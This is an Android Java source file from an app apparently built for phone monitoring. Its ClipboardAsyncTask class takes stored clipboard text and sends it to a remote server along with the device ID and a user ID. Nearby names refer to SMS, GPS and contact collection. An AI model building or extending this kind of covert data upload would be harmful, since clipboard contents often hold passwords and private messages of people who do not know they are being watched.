package com.hinj.asynctask;

/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */

import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Handler;
import android.provider.Settings.Secure;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class ClipboardAsyncTask extends AsyncTask<String, Void, String> {
	
	private static final String TAG = "ClipboardAsyncTask";
	private Context ctx;
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;	
	private String clip_board_string;
	private Handler handler;
	
	/**
	 * 
	 */
	public ClipboardAsyncTask(final Context ctx, DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;

	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected final String doInBackground(String... params) {
		
		try{
			getClipboardData();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedClipboardText();
		}
		
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
	/********************geCallList Start****************************
	 * 
	 * Get all Contact name with contact number
	 * 
	 * **************************************************************/
	private void getClipboardData() {
		
	    		
	    		if (Utility.isNetworkAvailable(ctx)) {
					//new YourAsyncTask_ContactList().execute(CallDetailList, ""+ total);
					new ClipboardAsyncTaskPost().execute();
				}
         

	}
	
	/**
	 * posting data on server
	 */
	class ClipboardAsyncTaskPost extends AsyncTask<String, Void, Void> {

		private String getResponceCantactList;
		
		/**
		 * 
		 */
		public ClipboardAsyncTaskPost() {
		}
		
		@Override
		protected void onPreExecute() {
		}

		@SuppressWarnings("deprecation")
		@Override
		protected Void doInBackground(String... params) {        
			//make your request here - it will run in a different thread
			try{
				mRequestPostClass=new RequestPost();				
				String getUserID_SP = HinjAppPreferenceUtils.getRaId(ctx);
				String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
				clip_board_string = HinjAppPreferenceUtils.getClipboardStr(ctx);
			    
 				getResponceCantactList=mRequestPostClass.postClipBoardText(clip_board_string,getUserID_SP,android_id);
				
				final JSONObject responseObject = new JSONObject(getResponceCantactList);
				final JSONArray responseArray = responseObject.getJSONArray("clip_bord");
				if(responseArray.getJSONObject(0).toString().contains("success")){		
					
				}

			}
			catch (Exception e) {
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			// progressDialog1.dismiss();
		//	Log.i(TAG,getResponceCantactList);
			//getSms();
			//onComplete.onCompletedContacts();
		}
	}	

	/********************geCallList End******************************/
}
